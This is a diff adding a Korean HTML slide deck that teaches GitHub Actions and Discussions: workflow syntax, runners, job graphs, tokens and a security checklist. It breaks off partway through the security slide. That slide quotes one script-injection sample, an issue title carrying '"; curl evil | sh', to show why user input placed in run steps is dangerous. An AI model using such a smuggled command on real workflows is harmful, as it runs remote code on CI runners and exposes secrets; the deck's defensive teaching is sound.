@@ -1,0 +1,1094 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Actions & Discussions 스터디</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<meta name="description" content="GitHub Actions와 Discussions의 소개, 구동원리, 외부 활용 사례, 실습 과정을 한 덱에 담은 학습 슬라이드">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans+KR:wght@400;500;600;700&display=swap">
+<style>
+/* Layout: a 1280x720 "workflow run" canvas scaled to fit; under 760px wide the deck becomes a scrolling reader. */
+:root {
+  --paper: #f2f4f7;
+  --surface: #ffffff;
+  --ink: #16213a;
+  --muted: #5b6579;
+  --line: #d6dce6;
+  --accent: #2847c4;
+  --accent-soft: #e5eafb;
+  --run: #b86e00;
+  --run-soft: #fbf0dc;
+  --ok: #1a7f37;
+  --fail: #cf222e;
+  --code-bg: #eef1f6;
+  --code-key: #2847c4;
+  --code-str: #8a4b08;
+  --code-com: #7b8496;
+  --code-expr: #a21caf;
+  --font-display: "IBM Plex Sans KR", "Apple SD Gothic Neo", "Malgun Gothic", system-ui, sans-serif;
+  --font-body: "IBM Plex Sans KR", "Apple SD Gothic Neo", "Malgun Gothic", system-ui, sans-serif;
+  --font-mono: "IBM Plex Mono", ui-monospace, "SFMono-Regular", Menlo, Consolas, monospace;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --paper: #0f1421; --surface: #171e2f; --ink: #e5e9f2; --muted: #9aa4b8; --line: #2a3349;
+    --accent: #8aa2ff; --accent-soft: #1f2a4d; --run: #f0b54a; --run-soft: #33280f;
+    --ok: #4ac26b; --fail: #ff7b72; --code-bg: #121827; --code-key: #8aa2ff; --code-str: #f0b54a;
+    --code-com: #6e7891; --code-expr: #e88ce8; color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --paper: #0f1421; --surface: #171e2f; --ink: #e5e9f2; --muted: #9aa4b8; --line: #2a3349;
+  --accent: #8aa2ff; --accent-soft: #1f2a4d; --run: #f0b54a; --run-soft: #33280f;
+  --ok: #4ac26b; --fail: #ff7b72; --code-bg: #121827; --code-key: #8aa2ff; --code-str: #f0b54a;
+  --code-com: #6e7891; --code-expr: #e88ce8; color-scheme: dark;
+}
+
+html, body { height: 100%; }
+body {
+  background: var(--paper); color: var(--ink);
+  font-family: var(--font-body); font-size: 14px; line-height: 1.55;
+  word-break: keep-all; overflow-wrap: anywhere;
+}
+* { box-sizing: border-box; }
+a { color: var(--accent); }
+:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+
+/* ---------- chrome ---------- */
+.app { height: 100%; display: flex; flex-direction: column; }
+.bar {
+  display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
+  padding-block: 10px;
+  padding-left: max(16px, env(safe-area-inset-left, 0px));
+  padding-right: max(16px, env(safe-area-inset-right, 0px));
+  border-bottom: 1px solid var(--line); background: var(--surface);
+  font-size: 13px;
+}
+.bar .brand { font-weight: 700; letter-spacing: -0.01em; }
+.bar .part { color: var(--muted); font-family: var(--font-mono); font-size: 12px; min-width: 0; }
+.bar .spacer { flex: 1; }
+.btn {
+  font: inherit; font-size: 13px; color: var(--ink); background: var(--surface);
+  border: 1px solid var(--line); border-radius: 6px; padding: 5px 10px; cursor: pointer;
+}
+.btn:hover { border-color: var(--accent); color: var(--accent); }
+.count { font-family: var(--font-mono); font-size: 12px; color: var(--muted); font-variant-numeric: tabular-nums; min-width: 56px; text-align: center; }
+.progress { height: 3px; background: var(--line); }
+.progress i { display: block; height: 100%; width: 0; background: var(--accent); transition: width .25s ease; }
+.stage { flex: 1; position: relative; overflow: hidden; }
+.hint { color: var(--muted); font-size: 12px; }
+
+/* ---------- slide canvas ---------- */
+.slide {
+  position: absolute; left: 50%; top: 50%;
+  width: 1280px; height: 720px;
+  transform: translate(-50%, -50%) scale(var(--s, 1));
+  background: var(--surface); border: 1px solid var(--line); border-radius: 10px;
+  padding: 56px 72px 48px; display: none; flex-direction: column; gap: 22px;
+  font-size: 21px; line-height: 1.55; overflow: hidden;
+}
+.slide.active { display: flex; }
+.slide > header { display: flex; flex-direction: column; gap: 6px; }
+.eyebrow {
+  font-family: var(--font-mono); font-size: 14px; letter-spacing: 0.08em; text-transform: uppercase;
+  color: var(--accent); display: flex; align-items: center; gap: 10px;
+}
+.eyebrow .dot { width: 10px; height: 10px; border-radius: 50%; background: var(--run); box-shadow: 0 0 0 4px var(--run-soft); }
+h1, h2, h3 { font-family: var(--font-display); margin: 0; text-wrap: balance; letter-spacing: -0.02em; }
+h2 { font-size: 40px; line-height: 1.2; font-weight: 700; }
+h3 { font-size: 23px; line-height: 1.3; font-weight: 700; }
+p { margin: 0; }
+.lead { font-size: 24px; color: var(--muted); max-width: 46ch; }
+.muted { color: var(--muted); }
+.small { font-size: 17px; }
+ul.list { margin: 0; padding: 0; list-style: none; display: flex; flex-direction: column; gap: 12px; }
+ul.list li { padding-left: 26px; position: relative; }
+ul.list li::before { content: ""; position: absolute; left: 4px; top: .62em; width: 9px; height: 9px; border-radius: 2px; background: var(--accent); }
+ol.steps { margin: 0; padding: 0; list-style: none; counter-reset: st; display: flex; flex-direction: column; gap: 11px; }
+ol.steps li { counter-increment: st; padding-left: 40px; position: relative; }
+ol.steps li::before {
+  content: counter(st); position: absolute; left: 0; top: 2px; width: 27px; height: 27px; border-radius: 50%;
+  border: 2px solid var(--accent); color: var(--accent); font-family: var(--font-mono); font-size: 14px; font-weight: 600;
+  display: grid; place-items: center;
+}
+code, .mono { font-family: var(--font-mono); font-size: .86em; }
+:not(pre) > code { background: var(--code-bg); padding: 1px 6px; border-radius: 4px; }
+.cols { display: grid; grid-template-columns: 1fr 1fr; gap: 36px; align-items: start; flex: 1; min-height: 0; }
+.cols.wide-left { grid-template-columns: 1.25fr 1fr; }
+.cols.wide-right { grid-template-columns: 1fr 1.3fr; }
+.cols > * { min-width: 0; }
+.stack { display: flex; flex-direction: column; gap: 14px; }
+.grid3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 18px; }
+.grid2 { display: grid; grid-template-columns: repeat(2, 1fr); gap: 18px; }
+.cell { border: 1px solid var(--line); border-radius: 8px; padding: 18px 20px; display: flex; flex-direction: column; gap: 8px; background: var(--paper); }
+.cell h3 { font-size: 21px; }
+.cell p { font-size: 17px; color: var(--muted); }
+.cell .tag { font-family: var(--font-mono); font-size: 13px; color: var(--accent); }
+.note {
+  border-left: 4px solid var(--run); background: var(--run-soft); padding: 12px 16px; border-radius: 0 6px 6px 0; font-size: 18px;
+}
+.note b { color: var(--run); }
+
+/* code */
+pre.code {
+  margin: 0; background: var(--code-bg); border: 1px solid var(--line); border-radius: 8px;
+  padding: 16px 18px; font-family: var(--font-mono); font-size: 15px; line-height: 1.5;
+  overflow: auto; white-space: pre; tab-size: 2; min-height: 0;
+}
+pre.code.sm { font-size: 13px; }
+pre.code .k { color: var(--code-key); }
+pre.code .s { color: var(--code-str); }
+pre.code .c { color: var(--code-com); font-style: italic; }
+pre.code .e { color: var(--code-expr); }
+.file { font-family: var(--font-mono); font-size: 13px; color: var(--muted); margin-bottom: -8px; }
+
+/* tables */
+.tbl-wrap { overflow-x: auto; }
+table { border-collapse: collapse; width: 100%; font-size: 18px; }
+th, td { text-align: left; padding: 10px 14px; border-bottom: 1px solid var(--line); vertical-align: top; }
+th { font-size: 14px; font-family: var(--font-mono); text-transform: uppercase; letter-spacing: .06em; color: var(--muted); font-weight: 500; }
+td:first-child { font-weight: 600; white-space: nowrap; }
+
+/* pipeline diagram */
+.pipe { display: flex; align-items: stretch; gap: 0; }
+.pipe .node {
+  flex: 1; border: 1.5px solid var(--line); background: var(--paper); border-radius: 8px; padding: 14px 14px;
+  display: flex; flex-direction: column; gap: 6px; min-width: 0;
+}
+.pipe .node b { font-size: 19px; }
+.pipe .node span { font-size: 15px; color: var(--muted); line-height: 1.4; }
+.pipe .node .mono { color: var(--accent); font-size: 13px; }
+.pipe .arrow { width: 30px; display: grid; place-items: center; color: var(--muted); font-family: var(--font-mono); font-size: 20px; flex: none; }
+.pipe .node.hot { border-color: var(--run); background: var(--run-soft); }
+.pipe .node.done { border-color: var(--ok); }
+
+/* job graph */
+.jobs { display: grid; grid-template-columns: 1fr 40px 1fr 40px 1fr; align-items: center; gap: 10px 0; }
+.job { border: 1.5px solid var(--line); border-radius: 8px; padding: 10px 14px; background: var(--paper); display: flex; align-items: center; gap: 10px; font-family: var(--font-mono); font-size: 16px; }
+.job .st { width: 14px; height: 14px; border-radius: 50%; flex: none; }
+.st.ok { background: var(--ok); }
+.st.run { background: var(--run); box-shadow: 0 0 0 4px var(--run-soft); }
+.st.wait { border: 2px solid var(--muted); }
+.jobs .lane { display: flex; flex-direction: column; gap: 10px; }
+.jobs .to { text-align: center; color: var(--muted); font-family: var(--font-mono); }
+.legend { display: flex; gap: 22px; font-size: 15px; color: var(--muted); flex-wrap: wrap; }
+.legend span { display: inline-flex; align-items: center; gap: 8px; }
+
+/* cover & dividers */
+.slide.cover { justify-content: space-between; padding: 72px 80px 56px; }
+.cover h1 { font-size: 68px; line-height: 1.08; font-weight: 700; max-width: 15ch; }
+.cover .sub { font-size: 26px; color: var(--muted); max-width: 38ch; }
+.cover .meta { display: flex; gap: 32px; font-family: var(--font-mono); font-size: 15px; color: var(--muted); flex-wrap: wrap; }
+.runlog { font-family: var(--font-mono); font-size: 16px; display: flex; flex-direction: column; gap: 6px; }
+.runlog div { display: flex; align-items: center; gap: 12px; }
+.runlog .st, .legend .st { display: inline-block; width: 12px; height: 12px; border-radius: 50%; flex: none; }
+.slide.divider { justify-content: center; gap: 18px; background: var(--accent-soft); }
+.divider .num { font-family: var(--font-mono); font-size: 18px; color: var(--accent); letter-spacing: .1em; }
+.divider h2 { font-size: 62px; }
+.divider p { font-size: 24px; color: var(--muted); max-width: 40ch; }
+
+.agenda { display: grid; grid-template-columns: repeat(5, 1fr); gap: 14px; }
+.agenda .cell { background: var(--surface); }
+.agenda .cell .tag { font-size: 14px; }
+.lab-badge { display: inline-flex; align-items: center; gap: 8px; font-family: var(--font-mono); font-size: 14px; color: var(--run); border: 1.5px solid var(--run); border-radius: 999px; padding: 2px 12px; width: fit-content; }
+.foot { margin-top: auto; font-size: 15px; color: var(--muted); display: flex; gap: 24px; flex-wrap: wrap; }
+
+/* ---------- reader mode (narrow screens) ---------- */
+@media (max-width: 760px), (max-height: 440px) {
+  html, body { height: auto; }
+  .app { height: auto; }
+  .bar { position: sticky; top: env(safe-area-inset-top, 0px); z-index: 2; }
+  .bar .nav, .bar .hint { display: none; }
+  .progress { display: none; }
+  .stage {
+    overflow: visible; display: flex; flex-direction: column; gap: 16px;
+    padding-block: 16px 32px;
+    padding-left: max(16px, env(safe-area-inset-left, 0px));
+    padding-right: max(16px, env(safe-area-inset-right, 0px));
+  }
+  .slide {
+    position: static; transform: none; width: auto; height: auto; display: flex;
+    padding: 24px 20px; font-size: 16px; gap: 16px;
+  }
+  .slide.cover { padding: 28px 20px; gap: 22px; }
+  .cover h1 { font-size: 34px; }
+  .cover .sub { font-size: 18px; }
+  .divider h2 { font-size: 32px; }
+  .divider p, .lead { font-size: 17px; }
+  h2 { font-size: 25px; }
+  h3, .cell h3 { font-size: 18px; }
+  .cell p, .note, table, .small { font-size: 15px; }
+  pre.code { font-size: 12.5px; }
+  .cols, .cols.wide-left, .cols.wide-right, .grid2, .grid3, .agenda { grid-template-columns: 1fr; }
+  .pipe { flex-direction: column; }
+  .pipe .arrow { width: auto; height: 22px; transform: rotate(90deg); }
+  .jobs { grid-template-columns: 1fr; }
+  .jobs .to { transform: rotate(90deg); }
+  .job { font-size: 14px; }
+}
+@media (prefers-reduced-motion: reduce) { .progress i { transition: none; } }
+</style>
+</head>
+<body>
+<div class="app">
+  <div class="bar">
+    <span class="brand">Actions &amp; Discussions 스터디</span>
+    <span class="part" id="partLabel"></span>
+    <span class="spacer"></span>
+    <span class="hint">← → 키로 이동</span>
+    <span class="nav" style="display:flex;gap:6px;align-items:center">
+      <button class="btn" id="prevBtn" type="button" aria-label="이전 슬라이드">이전</button>
+      <span class="count" id="count">1 / 1</span>
+      <button class="btn" id="nextBtn" type="button" aria-label="다음 슬라이드">다음</button>
+      <button class="btn" id="fsBtn" type="button" aria-label="전체 화면">전체 화면</button>
+    </span>
+  </div>
+  <div class="progress"><i id="prog"></i></div>
+  <main class="stage" id="stage">
+
+<!-- ===================== 0. 시작 ===================== -->
+<section class="slide cover" data-part="시작">
+  <div class="eyebrow"><span class="dot"></span> Study Deck · 이론 + 실습</div>
+  <div class="stack" style="gap:20px">
+    <h1>GitHub Actions &amp; Discussions 스터디</h1>
+    <p class="sub">저장소 안에서 돌아가는 자동화와 커뮤니티 포럼을 이해하고, 직접 만들어 보며 익힙니다.</p>
+  </div>
+  <div class="runlog" aria-label="오늘의 실행 단계">
+    <div><i class="st ok"></i> Part 1 · Actions 소개</div>
+    <div><i class="st ok"></i> Part 2 · Actions 구동원리</div>
+    <div><i class="st ok"></i> Part 3 · Discussions 소개와 구동원리</div>
+    <div><i class="st ok"></i> Part 4 · 외부 활용 사례</div>
+    <div><i class="st run"></i> Part 5 · 실습 Lab 0 ~ 7</div>
+  </div>
+  <div class="meta"><span>repo · ljd6805/github-actions-discussions-study</span><span>2026.10</span></div>
+</section>
+
+<section class="slide" data-part="시작">
+  <header><div class="eyebrow">오늘의 흐름</div><h2>이론 네 파트, 그다음 손으로 익히는 실습</h2></header>
+  <div class="agenda">
+    <div class="cell"><span class="tag">Part 1</span><h3>Actions 소개</h3><p>무엇이고 왜 쓰는지, 핵심 용어 6개</p></div>
+    <div class="cell"><span class="tag">Part 2</span><h3>Actions 구동원리</h3><p>이벤트에서 러너까지, 잡 그래프, 토큰과 보안</p></div>
+    <div class="cell"><span class="tag">Part 3</span><h3>Discussions</h3><p>Issues와의 차이, 카테고리, 데이터 모델과 이벤트</p></div>
+    <div class="cell"><span class="tag">Part 4</span><h3>외부 활용 사례</h3><p>오픈소스 프로젝트와 도구들이 실제로 쓰는 방식</p></div>
+    <div class="cell"><span class="tag">Part 5</span><h3>실습</h3><p>Hello부터 Discussions 자동화까지 Lab 8개</p></div>
+  </div>
+  <div class="note"><b>실습 저장소</b> 모든 예제 워크플로와 템플릿은 이 저장소의 <code>.github/</code> 와 <code>labs/</code> 에 들어 있습니다. 슬라이드를 보며 바로 실행해 보세요.</div>
+</section>
+
+<section class="slide" data-part="시작">
+  <header><div class="eyebrow">학습 목표</div><h2>스터디를 마치면 할 수 있는 것</h2></header>
+  <ul class="list" style="font-size:24px;gap:20px">
+    <li>워크플로 YAML을 읽고 <b>언제, 어디서, 무엇이</b> 실행되는지 설명할 수 있다.</li>
+    <li>matrix CI, 아티팩트, GitHub Pages 배포 워크플로를 직접 만들고 고칠 수 있다.</li>
+    <li><code>GITHUB_TOKEN</code> 권한과 서드파티 액션의 보안 위험을 판단할 수 있다.</li>
+    <li>Discussions를 켜고 카테고리, 템플릿, 답변 채택으로 커뮤니티를 운영할 수 있다.</li>
+    <li>Discussions 이벤트와 GraphQL API를 Actions로 연결해 운영을 자동화할 수 있다.</li>
+  </ul>
+</section>
+
+<!-- ===================== Part 1 ===================== -->
+<section class="slide divider" data-part="Part 1 · Actions 소개">
+  <span class="num">PART 1</span>
+  <h2>GitHub Actions 소개</h2>
+  <p>저장소에서 일어나는 일에 반응해 코드를 실행하는 GitHub 내장 자동화 플랫폼</p>
+</section>
+
+<section class="slide" data-part="Part 1 · Actions 소개">
+  <header><div class="eyebrow">What</div><h2>GitHub Actions는 무엇인가</h2></header>
+  <p class="lead">push, PR, 이슈, 스케줄 같은 <b>이벤트</b>가 생기면, 저장소에 적어 둔 <b>워크플로</b>를 GitHub가 준비한 <b>러너</b>에서 실행합니다.</p>
+  <div class="grid3">
+    <div class="cell"><span class="tag">CI</span><h3>지속적 통합</h3><p>커밋과 PR마다 빌드, 린트, 테스트를 돌려 깨진 코드가 main에 들어가지 않게 막습니다.</p></div>
+    <div class="cell"><span class="tag">CD</span><h3>지속적 배포</h3><p>태그나 main 병합을 계기로 패키지 배포, 컨테이너 이미지 푸시, 웹사이트 배포를 합니다.</p></div>
+    <div class="cell"><span class="tag">Ops</span><h3>저장소 운영 자동화</h3><p>이슈 라벨링, 오래된 이슈 정리, 릴리스 노트 작성, Discussions 공지 같은 반복 업무를 맡깁니다.</p></div>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 1 · Actions 소개">
+  <header><div class="eyebrow">Why</div><h2>왜 Actions를 쓰는가</h2></header>
+  <div class="cols">
+    <ul class="list">
+      <li><b>코드와 같은 곳에 산다.</b> 워크플로는 <code>.github/workflows/*.yml</code> 파일이라 PR로 리뷰하고 이력을 남깁니다.</li>
+      <li><b>GitHub 이벤트를 그대로 쓴다.</b> push, PR, 이슈, Discussions, 릴리스, 스케줄, 수동 실행까지 수십 종류.</li>
+      <li><b>재사용 생태계.</b> Marketplace의 액션을 <code>uses:</code> 한 줄로 가져다 씁니다.</li>
+    </ul>
+    <ul class="list">
+      <li><b>관리형 러너.</b> Linux, Windows, macOS 머신을 GitHub가 제공하고, 필요하면 자체 서버도 붙입니다.</li>
+      <li><b>비용.</b> public 저장소의 표준 러너는 무료이고, private 저장소는 플랜별 무료 분량(Free 플랜 월 2,000분)이 있습니다.</li>
+      <li><b>결과가 PR에 붙는다.</b> 체크 상태, 로그, 요약, 아티팩트가 커밋과 PR 화면에 바로 보입니다.</li>
+    </ul>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 1 · Actions 소개">
+  <header><div class="eyebrow">Vocabulary</div><h2>핵심 용어 6개</h2></header>
+  <div class="grid3">
+    <div class="cell"><span class="tag">workflow</span><h3>워크플로</h3><p>자동화 한 단위. <code>.github/workflows/</code> 안의 YAML 파일 하나가 워크플로 하나입니다.</p></div>
+    <div class="cell"><span class="tag">on: event</span><h3>이벤트</h3><p>워크플로를 깨우는 계기. <code>push</code>, <code>pull_request</code>, <code>schedule</code>, <code>workflow_dispatch</code> 등.</p></div>
+    <div class="cell"><span class="tag">jobs</span><h3>잡</h3><p>한 러너에서 실행되는 스텝 묶음. 잡끼리는 기본적으로 병렬로 돕니다.</p></div>
+    <div class="cell"><span class="tag">steps</span><h3>스텝</h3><p>잡 안에서 순서대로 실행되는 명령(<code>run</code>)이나 액션(<code>uses</code>).</p></div>
+    <div class="cell"><span class="tag">uses: owner/repo@ref</span><h3>액션</h3><p>재사용 가능한 스텝 패키지. 예: <code>actions/checkout</code>, <code>actions/setup-node</code>.</p></div>
+    <div class="cell"><span class="tag">runs-on</span><h3>러너</h3><p>잡을 실제로 실행하는 머신. GitHub 호스팅 또는 자체 호스팅.</p></div>
+  </div>
+</section>
+
+<!-- ===================== Part 2 ===================== -->
+<section class="slide divider" data-part="Part 2 · Actions 구동원리">
+  <span class="num">PART 2</span>
+  <h2>Actions 구동원리</h2>
+  <p>이벤트 하나가 로그와 체크 표시가 되기까지 무슨 일이 일어나는가</p>
+</section>
+
+<section class="slide" data-part="Part 2 · Actions 구동원리">
+  <header><div class="eyebrow">Run lifecycle</div><h2>이벤트에서 결과까지</h2></header>
+  <div class="pipe">
+    <div class="node"><span class="mono">1 · event</span><b>이벤트 발생</b><span>push, PR 열림, Discussion 생성, cron 시각 도달</span></div>
+    <div class="arrow">→</div>
+    <div class="node"><span class="mono">2 · match</span><b>워크플로 매칭</b><span>이벤트 커밋의 <code>.github/workflows/*.yml</code> 중 <code>on:</code> 조건이 맞는 것</span></div>
+    <div class="arrow">→</div>
+    <div class="node"><span class="mono">3 · queue</span><b>Run 생성</b><span>잡 의존성(<code>needs</code>)을 보고 실행 가능한 잡을 큐에 넣음</span></div>
+    <div class="arrow">→</div>
+    <div class="node hot"><span class="mono">4 · runner</span><b>러너 배정</b><span>잡마다 새 VM 또는 자체 러너가 잡을 가져가 스텝을 순서대로 실행</span></div>
+    <div class="arrow">→</div>
+    <div class="node done"><span class="mono">5 · report</span><b>결과 보고</b><span>체크 상태, 로그, 요약, 아티팩트가 커밋과 PR에 붙음</span></div>
+  </div>
+  <div class="grid2">
+    <div class="note"><b>어느 버전의 YAML이 쓰이나</b> push는 그 커밋의 파일, <code>workflow_dispatch</code>·<code>schedule</code>·<code>discussion</code> 같은 이벤트는 기본 브랜치의 파일이 기준입니다.</div>
+    <div class="note"><b>로그는 실시간</b> 러너는 스텝 출력을 스트리밍하고, 잡이 끝나면 상태(성공, 실패, 취소, 건너뜀)를 GitHub에 보고합니다.</div>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 2 · Actions 구동원리">
+  <header><div class="eyebrow">Anatomy</div><h2>워크플로 YAML 해부</h2></header>
+  <div class="cols wide-left">
+    <div class="stack">
+      <div class="file">.github/workflows/ci.yml</div>
+<pre class="code" data-lang="yaml">name: CI                       # Actions 탭에 보일 이름
+on:                            # 언제?
+  push:
+    branches: [main]
+  pull_request:
+permissions:                   # 토큰 권한 (최소로)
+  contents: read
+jobs:
+  test:                        # 잡 ID
+    runs-on: ubuntu-latest     # 어디서?
+    steps:                     # 무엇을? (위에서 아래로)
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - run: npm ci
+      - run: npm test</pre>
+    </div>
+    <div class="stack">
+      <div class="cell"><span class="tag">on</span><p>트리거 목록. 여러 이벤트를 걸 수 있고 브랜치, 경로, 타입으로 거릅니다.</p></div>
+      <div class="cell"><span class="tag">jobs.&lt;id&gt;.runs-on</span><p>러너 라벨. <code>ubuntu-latest</code>, <code>windows-latest</code>, <code>macos-latest</code> 또는 자체 러너 라벨.</p></div>
+      <div class="cell"><span class="tag">steps[].uses / run</span><p><code>uses</code>는 액션 호출, <code>run</code>은 셸 명령. <code>with</code>로 액션 입력값을 넘깁니다.</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 2 · Actions 구동원리">
+  <header><div class="eyebrow">Runners</div><h2>러너: 잡이 실제로 도는 곳</h2></header>
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th></th><th>GitHub-hosted</th><th>Self-hosted</th></tr></thead>
+      <tbody>
+        <tr><td>머신</td><td>잡마다 새로 만든 VM, 끝나면 폐기</td><td>내 서버, 사내망, GPU 머신 등에 러너 앱 설치</td></tr>
+        <tr><td>OS</td><td>Ubuntu, Windows, macOS (도구 대부분 미리 설치)</td><td>원하는 OS와 하드웨어</td></tr>
+        <tr><td>관리</td><td>GitHub가 패치·확장</td><td>직접 업데이트하고 보안 관리</td></tr>
+        <tr><td>비용</td><td>public 무료, private는 분 단위 과금</td><td>Actions 사용료 없음, 인프라 비용은 본인</td></tr>
+        <tr><td>주의</td><td>잡 사이에 파일이 남지 않음</td><td>public 저장소에 붙이면 외부 PR 코드가 내 서버에서 돌 수 있음</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="note"><b>핵심</b> 같은 잡의 스텝들은 한 머신을 공유하지만, 잡끼리는 다른 머신입니다. 잡 사이에 결과를 넘기려면 <code>outputs</code>, 아티팩트, 캐시를 씁니다.</div>
+</section>
+
+<section class="slide" data-part="Part 2 · Actions 구동원리">
+  <header><div class="eyebrow">Job graph</div><h2>잡은 기본 병렬, <code>needs</code>로 순서, <code>matrix</code>로 확장</h2></header>
+  <div class="cols wide-right">
+<pre class="code" data-lang="yaml">jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps: [...]
+  test:
+    strategy:
+      matrix:
+        node: [20, 22, 24]
+    runs-on: ubuntu-latest
+    steps: [...]
+  build:
+    needs: [lint, test]
+    steps: [...]
+  deploy:
+    needs: build
+    if: github.ref == 'refs/heads/main'
+    steps: [...]</pre>
+    <div class="stack" style="gap:20px">
+      <div class="jobs">
+        <div class="lane">
+          <div class="job"><span class="st ok"></span>lint</div>
+          <div class="job"><span class="st ok"></span>test (20)</div>
+          <div class="job"><span class="st ok"></span>test (22)</div>
+          <div class="job"><span class="st ok"></span>test (24)</div>
+        </div>
+        <div class="to">→</div>
+        <div class="lane"><div class="job"><span class="st run"></span>build</div></div>
+        <div class="to">→</div>
+        <div class="lane"><div class="job"><span class="st wait"></span>deploy</div></div>
+      </div>
+      <div class="legend"><span><i class="st ok"></i>성공</span><span><i class="st run"></i>실행 중</span><span><i class="st wait"></i>대기</span></div>
+      <p class="small muted">matrix 값 3개가 잡 3개로 펼쳐져 동시에 돕니다. build는 lint와 test 4개가 모두 성공해야 시작하고, deploy는 main 브랜치일 때만 실행됩니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 2 · Actions 구동원리">
+  <header><div class="eyebrow">Contexts &amp; expressions</div><h2>컨텍스트와 표현식 <code>${{ }}</code></h2></header>
+  <div class="cols">
+<pre class="code" data-lang="yaml">env:
+  APP_ENV: staging
+steps:
+  - id: ver
+    run: echo "tag=v$(date +%Y%m%d)" >> "$GITHUB_OUTPUT"
+  - name: 이전 스텝 값 쓰기
+    run: echo "${{ steps.ver.outputs.tag }}"
+  - name: main에서만
+    if: github.ref_name == 'main'
+    run: ./deploy.sh
+    env:
+      API_KEY: ${{ secrets.API_KEY }}
+  - if: failure()
+    run: echo "앞 스텝이 실패했을 때만 실행"</pre>
+    <div class="stack">
+      <div class="tbl-wrap"><table>
+        <tbody>
+          <tr><td><code>github.*</code></td><td>이벤트, 저장소, 커밋, 실행자 정보</td></tr>
+          <tr><td><code>env.*</code></td><td>워크플로·잡·스텝 단위 환경 변수</td></tr>
+          <tr><td><code>secrets.*</code></td><td>저장소·환경에 등록한 비밀값, 로그에서 가려짐</td></tr>
+          <tr><td><code>steps.&lt;id&gt;.outputs</code></td><td><code>$GITHUB_OUTPUT</code>에 쓴 값</td></tr>
+          <tr><td><code>needs.&lt;job&gt;.outputs</code></td><td>앞 잡이 내보낸 값</td></tr>
+          <tr><td><code>matrix.*</code>, <code>inputs.*</code></td><td>matrix 조합, 수동 실행 입력값</td></tr>
+        </tbody>
+      </table></div>
+      <p class="small muted">표현식은 러너로 보내기 전에 GitHub가 문자열로 치환합니다. 그래서 사용자 입력을 <code>run:</code>에 직접 넣으면 위험합니다 (Part 2 보안 참고).</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 2 · Actions 구동원리">
+  <header><div class="eyebrow">GITHUB_TOKEN</div><h2>자동 발급 토큰과 권한</h2></header>
+  <div class="cols">
+    <ul class="list">
+      <li>실행마다 GitHub가 <code>GITHUB_TOKEN</code>을 새로 발급하고, 잡이 끝나면 만료됩니다.</li>
+      <li><code>permissions:</code> 블록으로 범위를 정합니다. 지정하지 않은 권한은 <code>none</code>이 됩니다.</li>
+      <li>이 토큰으로 만든 push, 이슈, Discussion은 <b>다른 워크플로를 깨우지 않습니다</b>. 무한 루프를 막기 위한 규칙입니다.</li>
+      <li>외부 서비스 키는 <b>Settings → Secrets and variables → Actions</b>에 등록하고 <code>secrets.NAME</code>으로 씁니다.</li>
+    </ul>
+<pre class="code" data-lang="yaml">permissions:
+  contents: read        # 코드 읽기
+  pull-requests: write  # PR 코멘트
+  discussions: write    # Discussions 쓰기
+  pages: write          # Pages 배포
+  id-token: write       # OIDC (클라우드 로그인)
+
+steps:
+  - run: gh pr comment 1 --body "LGTM"
+    env:
+      GH_TOKEN: ${{ github.token }}</pre>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 2 · Actions 구동원리">
+  <header><div class="eyebrow">Building blocks</div><h2>액션 3종과 재사용 워크플로</h2></header>
+  <div class="grid2">
+    <div class="cell"><span class="tag">JavaScript action</span><h3>Node로 실행</h3><p><code>action.yml</code> + JS 코드. 시작이 가장 빠르고 세 OS 러너에서 모두 동작. 예: <code>actions/checkout</code>.</p></div>
+    <div class="cell"><span class="tag">Docker container action</span><h3>컨테이너로 실행</h3><p>도구와 환경을 이미지에 고정. Linux 러너에서만 동작하고 이미지 준비 시간이 듭니다.</p></div>
+    <div class="cell"><span class="tag">Composite action</span><h3>스텝 묶음</h3><p>여러 <code>run</code>/<code>uses</code> 스텝을 하나의 액션으로 포장. 사내 공통 셋업에 적합.</p></div>
+    <div class="cell"><span class="tag">on: workflow_call</span><h3>재사용 워크플로</h3><p>잡 단위를 통째로 공유. <code>jobs.x.uses: org/repo/.github/workflows/ci.yml@v1</code>.</p></div>
+  </div>
+  <p class="small muted">액션 버전은 <code>@v4</code> 같은 태그, 브랜치, 커밋 SHA로 지정합니다. 태그는 바뀔 수 있으므로 서드파티 액션은 SHA 고정을 권장합니다.</p>
+</section>
+
+<section class="slide" data-part="Part 2 · Actions 구동원리">
+  <header><div class="eyebrow">Security</div><h2>보안 체크리스트</h2></header>
+  <div class="cols">
+    <ul class="list">
+      <li><b>최소 권한.</b> 워크플로 맨 위에 <code>permissions: contents: read</code>를 두고 필요한 잡에만 더 줍니다.</li>
+      <li><b>서드파티 액션 SHA 고정.</b> <code>uses: some/action@3f1c…</code>처럼 커밋 해시로. Dependabot이 업데이트를 제안하게 둡니다.</li>
+      <li><b><code>pull_request_target</code> 주의.</b> 쓰기 권한과 시크릿이 있는 상태라 외부 PR 코드를 checkout해 실행하면 안 됩니다.</li>
+      <li><b>스크립트 인젝션.</b> 이슈 제목, Discussion 본문 같은 사용자 입력은 <code>env:</code>로 받아 변수로 씁니다.</li>
+    </ul>
+    <div class="stack">
+      <div class="file">위험: 제목에 <code>"; curl evil | sh</code> 가 들어오면 실행됨</div>
